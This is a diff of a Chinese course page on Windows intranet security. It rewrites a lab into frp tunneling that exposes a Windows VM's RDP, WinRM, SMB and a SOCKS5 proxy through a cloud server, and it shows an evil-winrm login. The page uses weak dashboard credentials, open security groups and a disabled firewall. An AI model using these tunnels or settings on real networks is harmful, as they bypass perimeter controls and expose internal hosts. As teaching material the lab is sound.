@@ -20,7 +20,7 @@ title: "08.项目八 Windows内网安全"
 
 🔗
 
-**知识衔接**：前序项目按"服务搭建 → 网站部署 → 安全加固 → 远程管理 → 域管理 → 应用安全"构成了完整的服务器运维链。本项目转换视角，从网络边界切入——讲解当攻击者已经突破外网防线、进入企业内网后，如何利用 NAT 转发、内网穿透、凭据窃取等技术进行横向渗透与权限扩张，以及如何从网络层面构建纵深防御体系。通过理解"攻击者在内网中如何移动"，方能制定有效的内网隔离与监控策略。
+**知识衔接**：前序项目按"服务搭建 → 网站部署 → 安全加固 → 远程管理 → 域管理 → 应用安全"构成了完整的服务器运维链。本项目转换视角，从网络边界切入——讲解当攻击者已经突破外网防线、进入企业内网后，如何利用 frp 内网穿透、凭据窃取等技术进行横向渗透与权限扩张，以及如何从网络层面构建纵深防御体系。通过理解"攻击者在内网中如何移动"，方能制定有效的内网隔离与监控策略。
 
 ⚠️
 
@@ -198,421 +198,440 @@ RRAS NAT工作模式：
 
 ### 实验环境总体说明
 
-> 本项目所有实验均在 **阿里云 ECS（弹性云服务器）** 上完成，通过 **VPC（专有网络）+ 多 VSwitch 子网** 模拟真实的企业内网隔离拓扑。所有实验完成后**务必释放云资源**，避免产生额外费用。
+> 本项目使用 **阿里云 ECS** 作为公网穿透服务器，配合**本地虚拟机**模拟内网主机，通过 frp 实现真实的内网穿透。
 >
-> **预估费用**：按量付费约 ¥3-5/小时/台，实验总时长约 3-4 小时，总费用约 ¥30-50。学生应在实验结束后立即释放 ECS 实例和弹性公网 IP。
+> **实验架构**：
 >
-> **ECS 实例清单**（共 3 台）：
-
-| 实例名 | 角色 | 操作系统 | 规格 | 系统盘 |
-| --- | --- | --- | --- | --- |
-| **Kali Linux** | 攻击机（公网侧） | Kali Linux 2024+（自定义镜像或自行安装） | 2 vCPU / 4 GB | 40 GB |
-| **SRV01** | 双网卡网关 / DMZ 服务器 | Windows Server 2022（阿里云官方镜像） | 2 vCPU / 4 GB | 60 GB |
-| **SRV02** | 内网服务器 / 域控 | Windows Server 2022（阿里云官方镜像） | 2 vCPU / 4 GB | 60 GB |
-
+> | 设备 | 角色 | 运行位置 | 操作系统 |
+> | --- | --- | --- | --- |
+> | **阿里云 ECS** | 公网穿透服务器（frps） | 阿里云 | Ubuntu 22.04 |
+> | **SRV02** | 内网主机（frpc） | 本地 VMware/VirtualBox | Windows Server 2022 |
+> | **Kali Linux** | 攻击机 | 本地 VMware/VirtualBox | Kali Linux 2024+ |
+>
+> **预估费用**：ECS 按量付费约 ¥3-8（实验 3-4 小时）。**实验结束后务必释放 ECS 实例和弹性公网 IP，避免持续扣费。**
+>
 > ⚠️ **配置要求**：
-> - **SRV01** 需要绑定**两块弹性网卡（ENI）**，分别连接 DMZ 子网和内网子网
-> - **SRV02** 只绑定**一块网卡**，连接内网子网（无公网 IP，模拟与公网隔离的内网主机）
-> - **Kali** 绑定**一块网卡**，连接 DMZ 子网，并分配**弹性公网 IP（EIP）**
-> - 两个子网通过不同安全组实现隔离：Kali 无法直接访问 SRV02
-> - 所有实例在实验开始前创建**快照/自定义镜像**，便于实验后恢复
+> - ECS 需要分配**弹性公网 IP（EIP）**，安全组需放行 frp 相关端口
+> - SRV02 为本地虚拟机，NAT 模式（需能访问互联网以连接 ECS 的 frps）
+> - Kali 为本地虚拟机，需能访问互联网（连接 ECS 的 frp 映射端口）
 
 ---
 
-### 实验1：VMware虚拟网络环境搭建
+### 实验1：阿里云服务器购买与frp服务端部署
+
+> **实验目标**：购买阿里云 ECS 服务器作为公网中转服务器，部署 frp 服务端（frps），为后续内网穿透实验做准备。
 
 **网络拓扑设计**：
 
 ```
-                    VMware虚拟网络拓扑
+                    内网穿透实验拓扑
 
-  ┌─────────────────────────────────────────────────────┐
-  │  VMnet8（NAT模式）── 模拟"公网"                       │
-  │  网段：192.168.10.0/24                                │
-  │  网关：192.168.10.2（VMware NAT）                     │
-  │                                                       │
-  │   ┌──────────┐        ┌──────────────────┐          │
-  │   │  Kali    │        │     SRV01        │          │
-  │   │  攻击机  │        │   双网卡网关      │          │
-  │   │  .10.10  │◄──────►│   NAT网卡: .10.20│          │
-  │   └──────────┘        └────────┬─────────┘          │
-  └────────────────────────────────│─────────────────────┘
-                                   │ Host-Only网卡
-                                   │ .100.20
-  ┌────────────────────────────────│─────────────────────┐
-  │  VMnet1（仅主机模式）── 模拟"内网"                      │
-  │  网段：192.168.100.0/24                                │
-  │                                                       │
-  │                    ┌──────────────────┐              │
-  │                    │     SRV02        │              │
-  │                    │   内网服务器      │              │
-  │                    │   .100.30        │              │
-  │                    └──────────────────┘              │
-  └───────────────────────────────────────────────────────┘
+  ┌──────────┐          互联网            ┌──────────────────┐        ┌──────────┐
+  │  Kali    │◄────────────────────────►│   阿里云 ECS      │◄─隧道──│  SRV02   │
+  │  攻击机  │   通过EIP访问frp端口       │   公网IP: EIP    │        │ 内网主机  │
+  │  (本地)  │                           │   frps 服务端     │        │ frpc客户端│
+  └──────────┘                           │   端口: 7000/7500│        │  (本地VM) │
+                                         └──────────────────┘        └──────────┘
 
-  通信路径：
-  Kali(.10.10) ──直连──► SRV01(.10.20) ✓
-  Kali(.10.10) ──直连──► SRV02(.100.30) ✗（不在同一网段，无法直达）
-  SRV01(.10.20) ──直连──► SRV02(.100.30) ✓（通过Host-Only网卡）
+  工作流程：
+  ① SRV02（本地虚拟机）上的 frpc 主动连接阿里云 ECS 的 frps（7000端口），建立控制隧道
+  ② Kali 访问阿里云 ECS 的映射端口（如 10001）
+  ③ frps 通过隧道将流量转发给 frpc，frpc 再转给本地服务（RDP:3389, Web:80 等）
+
+  关键点：
+  - 阿里云 ECS 有公网IP，Kali 可通过互联网访问
+  - SRV02 在本地内网中，没有公网IP，通过 frp 隧道反向暴露服务
+  - 这就是真实的”内网穿透”场景——内网主机主动出站，通过公网服务器暴露服务
 ```
 
-**第一步：配置VMnet8（NAT模式，模拟公网）**
+**第一步：购买阿里云 ECS 服务器**
 
-VMware 默认已创建 VMnet8（NAT模式）。确认其配置：
+1. 访问 [阿里云官网](https://www.aliyun.com/)，注册并登录账号
+2. 进入 **云服务器 ECS** 控制台，点击”创建实例”
+3. 配置如下：
 
-1. 打开 VMware → 编辑 → 虚拟网络编辑器
-2. 选择 **VMnet8**
-3. 确认设置：
-   - 类型：NAT 模式
-   - 子网IP：`192.168.10.0`
-   - 子网掩码：`255.255.255.0`
-   - NAT设置中网关IP：`192.168.10.2`
-4. 点击"应用"并确定
+| 配置项 | 推荐选择 |
+| --- | --- |
+| **计费方式** | 按量付费（实验用完即释放，避免持续扣费） |
+| **地域** | 选择离你最近的区域（如华东1-杭州、华东2-上海） |
+| **实例规格** | ecs.t6-c1m2.large（2 vCPU / 4 GB）或更低规格即可 |
+| **镜像** | Ubuntu 22.04 64位（推荐）或 CentOS 8 |
+| **系统盘** | 40 GB 高效云盘 |
+| **网络** | 专有网络 VPC（使用默认 VPC） |
+| **公网IP** | 选择”分配公网 IPv4 地址”（按使用流量计费） |
+| **安全组** | 创建新安全组或使用默认安全组（后续配置规则） |
+| **登录凭证** | 设置 root 密码（记好密码！） |
 
-> ⚠️ **预期结果**：VMnet8 的子网 IP 为 192.168.10.0/24。如果默认的 VMnet8 子网不是 192.168.10.0，可在虚拟网络编辑器中修改子网 IP 后点击"应用"。
+4. 确认订单并创建实例
+5. 创建完成后，在 ECS 实例列表中记录 **公网 IP 地址**（如 `47.xxx.xxx.xxx`），后续实验中以 `<ECS公网IP>` 表示
 
-**第二步：配置VMnet1（仅主机模式，模拟内网）**
+> ⚠️ **费用提醒**：按量付费的 ECS 实验 3-4 小时费用约 ¥3-8（取决于规格和流量）。**实验结束后务必释放 ECS 实例和弹性公网 IP**，否则会持续扣费！
 
-1. 在虚拟网络编辑器中，选择 **VMnet1**
-2. 确认设置：
-   - 类型：仅主机模式
-   - 子网IP：`192.168.100.0`
-   - 子网掩码：`255.255.255.0`
-   - **取消勾选**"将主机虚拟适配器连接到此网络"（隔离内网，主机不参与）
-3. 点击"应用"并确定
+**第二步：配置阿里云安全组**
 
-> 💡 **取消"连接到主机"** 的原因：确保 VMnet1（内网）完全隔离，模拟真实的内网隔离效果。如果保留勾选，宿主机也能访问内网网段，不符合实验需求。
+安全组是阿里云 ECS 的虚拟防火墙，控制哪些端口可以从外部访问。
 
-**第三步：配置Kali虚拟机网络**
+1. 在 ECS 控制台 → 左侧菜单 → **安全组**
+2. 找到 ECS 实例关联的安全组，点击”配置规则”
+3. 添加以下**入方向**规则：
 
-Kali 只需一块网卡，连接 VMnet8：
+| 授权策略 | 协议类型 | 端口范围 | 授权对象 | 用途 |
+| --- | --- | --- | --- | --- |
+| 允许 | TCP | 22 | 0.0.0.0/0 | SSH 远程管理 |
+| 允许 | TCP | 7000 | 0.0.0.0/0 | frp 客户端连接端口 |
+| 允许 | TCP | 7500 | 0.0.0.0/0 | frp Dashboard 管理面板 |
+| 允许 | TCP | 10000-20000 | 0.0.0.0/0 | frp 隧道映射端口范围 |
+| 允许 | ICMP | -1/-1 | 0.0.0.0/0 | ping 测试 |
 
-1. 虚拟机设置 → 网络适配器 → 选择 **NAT模式**（对应 VMnet8）
-2. 启动 Kali，配置静态IP：
+> 💡 **安全组说明**：阿里云安全组默认拒绝所有入站流量，必须手动添加允许规则。`0.0.0.0/0` 表示允许所有来源 IP，实验环境可以使用；生产环境应限制为特定 IP。
+
+**第三步：SSH 连接 ECS 服务器**
 
 ```bash
-# 编辑网络配置（以NetworkManager为例）
-sudo nmcli connection modify "Wired connection 1" \
-    ipv4.addresses 192.168.10.10/24 \
-    ipv4.gateway 192.168.10.2 \
-    ipv4.dns 192.168.10.2 \
-    ipv4.method manual
+# 在本地电脑（宿主机）上使用 SSH 连接 ECS
+# Windows 用户可使用 PowerShell、PuTTY 或 Windows Terminal
 
-sudo nmcli connection up "Wired connection 1"
+ssh root@<ECS公网IP>
+# 输入购买时设置的 root 密码
 
-# 验证IP配置
-ip addr show
-# 预期输出包含：inet 192.168.10.10/24
-
-# 验证网关连通性
-ping -c 2 192.168.10.2
-# 预期：收到回复
+# 预期：成功登录 Ubuntu 系统，显示 root@xxx:~# 提示符
 ```
 
-**第四步：配置SRV01虚拟机网络（双网卡）**
+**第四步：在ECS上安装frp服务端**
 
-SRV01 需要两块网卡：
+```bash
+# 在 ECS 服务器上执行
 
-1. **网卡1（NAT模式）**：虚拟机设置 → 网络适配器 → NAT模式
-2. **网卡2（仅主机模式）**：点击"添加" → 网络适配器 → 仅主机模式 → 选择 VMnet1
+# 更新系统
+sudo apt update && sudo apt upgrade -y
 
-启动 SRV01，配置两块网卡的IP：
+# 下载 frp 最新版本
+# 访问 https://github.com/fatedier/frp/releases 获取最新版本号
+# 以下以 v0.61.1 为例，请替换为实际最新版本
+cd /opt
+sudo wget https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_linux_amd64.tar.gz
+sudo tar -xzf frp_0.61.1_linux_amd64.tar.gz
+sudo mv frp_0.61.1_linux_amd64 frp
+cd frp
 
-```powershell
-# 以管理员身份运行 PowerShell
+# 查看文件结构
+ls -la
+# 预期文件：
+# frps         —— 服务端可执行文件
+# frps.toml    —— 服务端配置文件（v0.52+ 使用 TOML 格式）
+# frpc         —— 客户端可执行文件（拷贝到内网主机使用）
+# frpc.toml    —— 客户端配置文件
+```
 
-# 查看网卡列表（确认两块网卡的名称）
-Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress
+**第五步：配置frp服务端（frps.toml）**
 
-# 通常：
-# - "以太网" 或 "Ethernet0" → NAT网卡（连接VMnet8）
-# - "以太网 2" 或 "Ethernet1" → Host-Only网卡（连接VMnet1）
+```bash
+# 在 ECS 上编辑 frps.toml
+sudo nano /opt/frp/frps.toml
+```
 
-# 配置NAT网卡（连接"公网"VMnet8）
-# 注意：将下面的"以太网"替换为实际的NAT网卡名称
-New-NetIPAddress -InterfaceAlias "以太网" -IPAddress 192.168.10.20 -PrefixLength 24 -DefaultGateway 192.168.10.2
-Set-DnsClientServerAddress -InterfaceAlias "以太网" -ServerAddresses 192.168.10.2
+写入以下配置内容：
 
-# 配置Host-Only网卡（连接"内网"VMnet1）
-# 注意：Host-Only网络不需要默认网关
-# 将"以太网 2"替换为实际的Host-Only网卡名称
-New-NetIPAddress -InterfaceAlias "以太网 2" -IPAddress 192.168.100.20 -PrefixLength 24
+```toml
+# frps.toml - frp 服务端配置
+# frp 服务端监听端口（客户端连接端口）
+bindPort = 7000
 
-# 验证双网卡配置
-Get-NetIPAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixLength | Format-Table
+# Dashboard（Web管理面板）配置
+webServer.addr = “0.0.0.0”
+webServer.port = 7500
+webServer.user = “admin”
+webServer.password = “admin123”
+
+# 认证方式（token模式，客户端必须提供相同token才能连接）
+auth.method = “token”
+auth.token = “ClassDemo2025”
+
+# 日志配置
+log.to = “./frps.log”
+log.level = “info”
+log.maxDays = 7
+
+# 允许客户端映射的端口范围
+allowPorts = [
+  { start = 10000, end = 20000 }
+]
+```
+
+```bash
+# 启动 frp 服务端
+sudo /opt/frp/frps -c /opt/frp/frps.toml
 
 # 预期输出：
-# 以太网      192.168.10.20     24
-# 以太网 2    192.168.100.20    24
-# Loopback    127.0.0.1         8
+# [I] frps tcp listen on 0.0.0.0:7000
+# [I] http service listen on 0.0.0.0:7500
+# [I] frps started successfully
 ```
 
-> ⚠️ **预期结果**：`Get-NetIPAddress` 输出中应显示两个不同的 IP 地址分别绑定在两块网卡上。如果只看到一块网卡，检查虚拟机设置中是否正确添加了第二块网卡。
-
-**第五步：配置SRV02虚拟机网络**
-
-SRV02 只需一块网卡，连接 VMnet1：
-
-1. 虚拟机设置 → 网络适配器 → 选择 **仅主机模式** → 选择 VMnet1
-2. 启动 SRV02，配置静态IP：
-
-```powershell
-# 以管理员身份运行 PowerShell
-
-# 配置Host-Only网卡
-New-NetIPAddress -InterfaceAlias "以太网" -IPAddress 192.168.100.30 -PrefixLength 24 -DefaultGateway 192.168.100.20
-Set-DnsClientServerAddress -InterfaceAlias "以太网" -ServerAddresses 192.168.100.20
-
-# 验证配置
-ipconfig
-# 预期输出：IPv4 地址为 192.168.100.30，默认网关为 192.168.100.20
-```
-
-> 💡 **网关设置为 SRV01（192.168.100.20）** 的原因：SRV01 充当内网到"公网"的路由网关。后续配置 NAT 转发后，SRV02 将通过 SRV01 访问外部网络。
-
-**第六步：验证网络连通性**
-
-从各台虚拟机测试连通性：
-
-```powershell
-# 在 SRV01 上测试（应该全部通）
-ping 192.168.10.10      # → Kali     ✓ 应通
-ping 192.168.100.30     # → SRV02    ✓ 应通
-ping 192.168.10.2       # → VMware网关 ✓ 应通
-```
+> ⚠️ **预期结果**：frps 成功启动，监听 7000 端口（客户端连接）和 7500 端口（Web管理面板）。保持终端运行（或使用 `tmux` / `nohup` 后台运行）。
 
 ```bash
-# 在 Kali 上测试
-ping -c 2 192.168.10.20     # → SRV01(NAT侧) ✓ 应通
-ping -c 2 192.168.100.30    # → SRV02          ✗ 应不通（不在同一网段）
-ping -c 2 192.168.100.20    # → SRV01(内网侧)  ✗ 应不通（不在同一网段）
+# 验证 frps 服务端已启动
+ss -tlnp | grep -E “7000|7500”
+# 预期输出：
+# LISTEN  0  128  0.0.0.0:7000  0.0.0.0:*
+# LISTEN  0  128  0.0.0.0:7500  0.0.0.0:*
+
+# 在本地浏览器中访问 frp Dashboard
+# 地址：http://<ECS公网IP>:7500
+# 用户名：admin  密码：admin123
+# 预期：显示 frp Dashboard 页面，可查看客户端连接状态和隧道信息
 ```
 
-```powershell
-# 在 SRV02 上测试
-ping 192.168.100.20     # → SRV01(内网侧) ✓ 应通
-ping 192.168.10.20      # → SRV01(NAT侧)  ✗ 应不通（未配置路由）
-ping 192.168.10.10      # → Kali           ✗ 应不通
-```
-
-> ⚠️ **预期结果**：
-> - Kali 能 ping 通 SRV01 的 NAT 侧地址（192.168.10.20），但**无法** ping 通 SRV02（192.168.100.30）——这证明了内网隔离
-> - SRV02 能 ping 通 SRV01 的内网侧地址（192.168.100.20），但**无法** ping 通 Kali——证明内网主机无法直接访问"公网"
-> - 只有 SRV01 同时能与两侧通信——这就是网关/DMZ的角色
+> 💡 **后台运行 frps**：
+> ```bash
+> # 使用 nohup 后台运行
+> nohup /opt/frp/frps -c /opt/frp/frps.toml > /dev/null 2>&1 &
+> 
+> # 或使用 tmux
+> tmux new-session -d -s frps '/opt/frp/frps -c /opt/frp/frps.toml'
+> # 重新连接：tmux attach -t frps
+> ```
 
 ---
 
-### 实验2：Windows NAT转发配置
+### 实验2：本地虚拟机配置与frp客户端部署
 
-**场景**：配置 SRV01 为 NAT 转发服务器，使内网主机（SRV02）可以通过 SRV01 访问"公网"，同时配置端口映射使"公网"主机（Kali）可以访问内网服务。
+> **实验目标**：在本地虚拟机（SRV02，模拟内网主机）上部署 frp 客户端，通过隧道将本地服务暴露到阿里云 ECS 上。
 
-**第一步：在SRV01上启用IP转发**
+**第一步：准备本地虚拟机（SRV02）**
 
-```powershell
-# 以管理员身份运行 PowerShell
+SRV02 是一台运行在本地 VMware/VirtualBox 中的 Windows Server 虚拟机，模拟企业内网中的服务器：
 
-# 查看当前IP转发状态（0=禁用，1=启用）
-Get-NetIPInterface | Select-Object InterfaceAlias, AddressFamily, Forwarding
+| 配置项 | 要求 |
+| --- | --- |
+| 操作系统 | Windows Server 2022 / 2025 |
+| 内存 | 4 GB |
+| 硬盘 | 60 GB |
+| 网络 | NAT 模式（需要能访问互联网，用于连接阿里云 ECS） |
 
-# 启用IP转发（通过注册表）
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 1
+> 💡 **关键理解**：SRV02 的网络模式可以是 NAT 或桥接，只要能访问互联网即可。frpc 需要主动连接阿里云 ECS 的 7000 端口，这是一条**出站连接**——企业防火墙通常允许出站连接，这正是内网穿透工具能工作的根本原因。
 
-# Windows Server 2025 推荐使用 PowerShell/注册表启用 IP 转发；旧版 netsh routing 命令可能不可用
-# 如需图形化配置，请在下一步使用 RRAS
-
-# 验证转发已启用
-Get-NetIPInterface | Select-Object InterfaceAlias, AddressFamily, Forwarding
-# 预期：所有接口的 Forwarding 列显示 Enabled
-
-# 重启使配置生效（或重启网络适配器）
-Restart-Computer -Force
-```
-
-> ⚠️ **预期结果**：重启后，`Get-NetIPInterface` 中两块网卡的 Forwarding 状态均为 Enabled。SRV01 现在充当路由器角色，可在两个网段之间转发数据包。
-
-**第二步：配置NAT（推荐使用 RRAS）**
-
-SRV01 重启后，配置 NAT 使内网主机可以通过 SRV01 访问外网。**Windows Server 2025 环境建议优先使用 RRAS 图形界面或 PowerShell 安装 Remote Access/Routing 角色**；旧版 `netsh routing ip nat` 命令在新系统中可能不可用或表现不稳定，不再作为首选方案。
-
-**方法一：使用 RRAS 图形界面配置 NAT（推荐）**
-
-1. 打开"服务器管理器" → 添加角色和功能
-2. 在"服务器角色"中勾选 **远程访问**
-3. 在"角色服务"中勾选 **路由**
-4. 完成安装
-5. 打开 RRAS 管理器：`Win+R` → 输入 `rrasmgmt.msc` → 回车
-6. 右键服务器名 → **配置并启用路由和远程访问**
-7. 选择 **网络地址转换(NAT)**
-8. 选择"公网"接口（NAT网卡，192.168.10.20）
-9. 选择"专用"接口（Host-Only网卡，192.168.100.20）
-10. 完成配置
-
-> ⚠️ **预期结果**：RRAS 管理器中显示 NAT 路由已启用，"公网"接口显示"公用接口"，Host-Only 接口显示"专用接口"。
-
-**方法二：使用 PowerShell 安装 Routing 角色（可选）**
+**第二步：在SRV02上启用基础服务**
 
 ```powershell
-# 在 SRV01 上以管理员身份运行
-Install-WindowsFeature RemoteAccess -IncludeManagementTools
-Install-WindowsFeature Routing -IncludeManagementTools
-Install-RemoteAccess -VpnType RoutingOnly
+# 在 SRV02 上以管理员身份运行 PowerShell
 
-# 安装完成后仍可使用 rrasmgmt.msc 打开 RRAS 管理器配置 NAT
-rrasmgmt.msc
-```
+# 1. 启用远程桌面
+Set-ItemProperty -Path “HKLM:\System\CurrentControlSet\Control\Terminal Server” -Name “fDenyTSConnections” -Value 0
+Enable-NetFirewallRule -DisplayGroup “Remote Desktop”
 
-> 💡 **课堂建议**：Windows Server 2025 上先用“服务器管理器 → 添加角色和功能 → 远程访问 → 路由”安装角色，再运行 RRAS 配置向导。端口映射仍使用 `netsh interface portproxy`，该命令适用于 Windows Server 2025。
-
-**第三步：验证NAT转发**
-
-```powershell
-# 在 SRV02 上测试是否可以通过 SRV01 访问"公网"
-# 先确认 SRV02 的网关指向 SRV01（192.168.100.20）
-ipconfig | findstr "默认网关"
-# 预期：默认网关 . . . . . . . . . : 192.168.100.20
-
-# 测试到 Kali 的连通性
-ping 192.168.10.10
-# 预期：收到回复（之前不通，现在通了！NAT转发生效）
-
-# 测试到 VMware NAT 网关的连通性
-ping 192.168.10.2
-# 预期：收到回复
-```
-
-> ⚠️ **预期结果**：SRV02 现在可以 ping 通 Kali（192.168.10.10）。如果仍然不通，检查：（1）SRV01 的 IP 转发是否已启用；（2）SRV02 的默认网关是否指向 192.168.100.20；（3）SRV01 的 Windows 防火墙是否阻止了转发。
-
-**第四步：配置端口映射（netsh portproxy）**
-
-配置 SRV01 将特定端口映射到 SRV02，使 Kali 可以通过 SRV01 访问 SRV02 的服务：
-
-```powershell
-# 在 SRV01 上以管理员身份运行
-
-# 先在 SRV02 上启用一些服务（用于测试端口映射）
-# 在 SRV02 上执行：
-# 启用远程桌面
-Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
-Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-
-# 启用 WinRM（远程管理）
+# 2. 启用 WinRM（远程管理）
 Enable-PSRemoting -Force
 
-# 关闭防火墙（仅实验环境）
+# 3. 启用 IIS Web 服务器（用于测试 HTTP 隧道）
+Install-WindowsFeature -Name Web-Server -IncludeManagementTools
+
+# 4. 创建测试页面
+Set-Content -Path “C:\inetpub\wwwroot\index.html” -Value “<html><body><h1>SRV02 内网服务器 - frp 隧道穿透成功！</h1><p>此页面通过 frp 内网穿透从阿里云 ECS 访问。</p></body></html>”
+
+# 5. 关闭防火墙（仅实验环境，方便测试）
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+# 6. 验证本地服务
+curl http://localhost
+# 预期：返回上面创建的 HTML 页面
 ```
+
+**第三步：将frp客户端拷贝到SRV02**
+
+从阿里云 ECS 上下载 frp 客户端到本地虚拟机：
+
+**方法一：直接在 SRV02 上下载（推荐）**
 
 ```powershell
-# 在 SRV01 上配置端口映射
+# 在 SRV02 上以管理员身份运行 PowerShell
+# 直接从 GitHub 下载 Windows 版 frp
 
-# RDP映射：Kali访问 192.168.10.20:3389 → 转发到 192.168.100.30:3389
-netsh interface portproxy add v4tov4 listenport=3389 listenaddress=192.168.10.20 connectport=3389 connectaddress=192.168.100.30
+cd C:\
+Invoke-WebRequest -Uri “https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_windows_amd64.zip” -OutFile “frp.zip”
+Expand-Archive -Path “frp.zip” -DestinationPath “C:\frp” -Force
 
-# Web映射：Kali访问 192.168.10.20:8080 → 转发到 192.168.100.30:80
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=192.168.10.20 connectport=80 connectaddress=192.168.100.30
-
-# WinRM映射：Kali访问 192.168.10.20:5985 → 转发到 192.168.100.30:5985
-netsh interface portproxy add v4tov4 listenport=5985 listenaddress=192.168.10.20 connectport=5985 connectaddress=192.168.100.30
-
-# 查看所有端口映射规则
-netsh interface portproxy show all
+# 验证文件
+Get-ChildItem C:\frp
+# 预期包含：frpc.exe、frpc.toml 等文件
 ```
 
-> ⚠️ **预期结果**：`netsh interface portproxy show all` 输出三行映射规则。如果 SRV01 的防火墙已关闭，Kali 即可通过 192.168.10.20 的对应端口访问 SRV02 的服务。
-
-**第五步：验证端口映射**
+**方法二：通过 SCP 从 ECS 拷贝（备选）**
 
 ```bash
-# 在 Kali 上测试
-
-# 测试RDP映射（通过SRV01的3389端口访问SRV02的RDP）
-nmap -p 3389 192.168.10.20
-# 预期：3389/tcp open
-
-# 测试Web映射（通过SRV01的8080端口访问SRV02的Web）
-curl http://192.168.10.20:8080
-# 预期：返回SRV02上IIS的默认页面
-
-# 测试WinRM映射
-evil-winrm -i 192.168.10.20 -u administrator -p 'P@ssw0rd'
-# 预期：连接到SRV02的WinRM服务（通过SRV01转发）
+# 在本地宿主机上执行，将 ECS 上的 frpc 文件下载到本地
+scp root@<ECS公网IP>:/opt/frp/frpc ./frpc
+scp root@<ECS公网IP>:/opt/frp/frpc.toml ./frpc.toml
+# 然后将文件拷贝到 SRV02 虚拟机中（通过 VMware 共享文件夹或 U 盘）
 ```
 
-> 💡 **教学意义**：端口映射是内网穿透的最基础形态。在实际渗透测试中，攻击者突破边界网关后，会通过端口映射将内网服务暴露出来，为后续横向移动提供通道。
+**方法三：使用 VMware 共享文件夹**
 
-**端口映射管理命令**：
+1. 将 frp 文件放在宿主机某目录
+2. 虚拟机设置 → 选项 → 共享文件夹 → 添加该目录
+3. 在 SRV02 中访问 `\\vmware-host\Shared Folders\` 拷贝文件
+
+**第四步：配置frp客户端（frpc.toml）**
 
 ```powershell
-# 删除单条映射规则
-netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=192.168.10.20
-
-# 重置所有端口映射规则
-netsh interface portproxy reset
-
-# 导出当前映射配置（备份）
-netsh interface portproxy show all > C:\portproxy_backup.txt
+# 在 SRV02 上编辑 frpc.toml
+notepad C:\frp\frpc.toml
 ```
+
+写入以下配置内容：
+
+```toml
+# frpc.toml - frp 客户端配置
+
+# frp 服务端地址（阿里云 ECS 的公网 IP）
+serverAddr = “<ECS公网IP>”
+serverPort = 7000
+
+# 认证（必须与服务端一致）
+auth.method = “token”
+auth.token = “ClassDemo2025”
+
+# 日志配置
+log.to = “./frpc.log”
+log.level = “info”
+
+# 隧道1：RDP远程桌面映射
+# Kali访问 <ECS公网IP>:10001 → SRV02的3389端口
+[[proxies]]
+name = “rdp”
+type = “tcp”
+localIP = “127.0.0.1”
+localPort = 3389
+remotePort = 10001
+
+# 隧道2：Web服务映射
+# Kali访问 <ECS公网IP>:10002 → SRV02的80端口
+[[proxies]]
+name = “web”
+type = “tcp”
+localIP = “127.0.0.1”
+localPort = 80
+remotePort = 10002
+
+# 隧道3：WinRM远程管理映射
+# Kali访问 <ECS公网IP>:10003 → SRV02的5985端口
+[[proxies]]
+name = “winrm”
+type = “tcp”
+localIP = “127.0.0.1”
+localPort = 5985
+remotePort = 10003
+
+# 隧道4：SMB文件共享映射
+# Kali访问 <ECS公网IP>:10004 → SRV02的445端口
+[[proxies]]
+name = “smb”
+type = “tcp”
+localIP = “127.0.0.1”
+localPort = 445
+remotePort = 10004
+
+# 隧道5：SOCKS5代理（通过frp隧道访问整个内网）
+[[proxies]]
+name = “socks5”
+type = “tcp”
+remotePort = 10080
+[proxies.plugin]
+type = “socks5”
+```
+
+> ⚠️ **重要**：将 `<ECS公网IP>` 替换为你的阿里云 ECS 的实际公网 IP 地址（如 `47.xxx.xxx.xxx`）。
+
+**第五步：启动frp客户端**
+
+```powershell
+# 在 SRV02 上以管理员身份运行 PowerShell
+
+# 启动 frp 客户端
+C:\frp\frpc.exe -c C:\frp\frpc.toml
+
+# 预期输出：
+# [I] [service.go:302] [xxxxxxxx] login to server success
+# [I] [proxy_manager.go:144] proxy added: [rdp web winrm smb socks5]
+# [I] [service.go:109] [xxxxxxxx] [rdp] start proxy success
+# [I] [service.go:109] [xxxxxxxx] [web] start proxy success
+# ...
+```
+
+> ⚠️ **预期结果**：客户端显示”login to server success”表示成功连接到阿里云 ECS 上的 frp 服务端。所有隧道（rdp、web、winrm、smb、socks5）均显示”start proxy success”。
+>
+> **如果连接失败**，检查：（1）阿里云安全组是否放行了 7000 端口；（2）frpc.toml 中的 `<ECS公网IP>` 和 token 是否正确；（3）SRV02 本地虚拟机是否能访问互联网。
 
 ---
 
-### 实验3：验证内网隔离与NAT效果
+### 实验3：验证frp隧道穿透效果
 
-**目的**：直观展示内网隔离的效果以及 NAT 转发前后的区别。
+> **实验目标**：通过 Kali 攻击机（或任何可访问互联网的电脑）验证 frp 隧道是否成功将 SRV02 的内网服务暴露到公网。
 
-**第一步：测试隔离性（NAT配置前记录状态）**
+**第一步：通过浏览器访问frp Dashboard**
+
+在本地电脑浏览器中打开：
+
+```
+http://<ECS公网IP>:7500
+```
+
+输入用户名 `admin`，密码 `admin123`，查看：
+- 客户端列表中 SRV02 应显示为”在线”
+- 隧道列表中 rdp、web、winrm、smb、socks5 均应显示正常
+
+**第二步：验证各隧道端口**
 
 ```bash
-# 在 Kali 上测试到 SRV02 的连通性
-# 此时应无法连通（如果NAT已配置，先通过快照恢复到初始状态再测试）
-ping -c 3 192.168.100.30
-# 预期：100% packet loss —— Kali 无法直接访问内网
+# 使用 nmap 扫描 ECS 的映射端口（在 Kali 或本地电脑上执行）
+
+nmap -p 10001,10002,10003,10004 <ECS公网IP>
+
+# 预期输出：
+# PORT     STATE  SERVICE
+# 10001/tcp open   隧道1(RDP)
+# 10002/tcp open   隧道2(Web)
+# 10003/tcp open   隧道3(WinRM)
+# 10004/tcp open   隧道4(SMB)
 ```
 
-**第二步：SRV02 启动一个Web服务用于测试**
-
-```powershell
-# 在 SRV02 上以管理员身份运行
-
-# 启用 IIS Web 服务器
-Install-WindowsFeature -Name Web-Server -IncludeManagementTools
-
-# 创建一个测试页面
